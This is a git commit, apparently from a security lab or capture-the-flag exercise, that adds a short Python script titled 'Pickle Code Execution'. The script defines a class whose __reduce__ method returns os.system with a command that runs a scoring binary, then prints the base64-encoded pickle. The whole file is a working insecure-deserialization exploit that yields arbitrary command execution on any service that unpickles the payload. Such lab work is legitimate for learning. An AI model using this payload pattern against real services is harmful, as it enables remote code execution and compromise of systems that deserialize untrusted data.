455201e72333750dfaa1e071151d3796c2133dde
Nabster <ait.massi@outlook.fr>
2024-04-12 20:58:38 +0200

    Pickle Code Execution

---
+++ Pickle-code-execution.py
@@ -0,0 +1,10 @@
+import base64
+import os
+import pickle
+
+class Test(object):
+        def __reduce__(self):
+                return (os.system,("/usr/local/bin/score c5fe03e2-e3a6-44dd-ba09-e7a184f25fbf",))
+        
+a=Test()
+print(base64.b64encode(pickle.dumps(a)))
